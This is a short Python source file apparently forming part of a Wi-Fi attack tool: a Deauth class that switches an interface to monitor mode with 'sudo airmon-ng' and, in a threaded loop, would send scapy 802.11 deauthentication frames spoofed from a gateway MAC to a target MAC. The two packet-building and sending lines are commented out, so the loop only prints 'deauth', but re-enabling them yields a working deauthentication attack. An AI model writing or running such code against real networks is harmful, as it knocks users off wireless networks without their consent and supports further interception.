import os
from threading import *
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf


class Deauth():
    def __init__(self):
        self.stop_event = Event()

    def start_deauth(self, iface_attack, target_mac, gateway_mac):
        self.iface_attack = iface_attack
        self.iface_attack_mon = "wlan0mon"
        self.target_mac = target_mac
        self.gateway_mac = gateway_mac

        self.set_iface_monitor()
        thread_run_deauth = Thread(target=self.run_deauth)
        thread_run_deauth.setDaemon(True)
        thread_run_deauth.start()

    def run_deauth(self):
        while not self.stop_event.is_set():
            # packet = RadioTap()/Dot11(addr1=self.target_mac, addr2=self.gateway_mac, addr3=self.gateway_mac)/Dot11Deauth(reason=7)
            # sendp(packet, inter=0.1, count=64, iface=self.iface_attack_mon, verbose=1)
            print("deauth")

    def stop_deauth(self):
        self.stop_event.set()
        self.set_iface_normal()

    def set_iface_monitor(self):
        cmd = f"sudo airmon-ng start {self.iface_attack}"
        os.system(cmd)

    def set_iface_normal(self):
        cmd = f"sudo airmon-ng stop {self.iface_attack_mon}"
        os.system(cmd)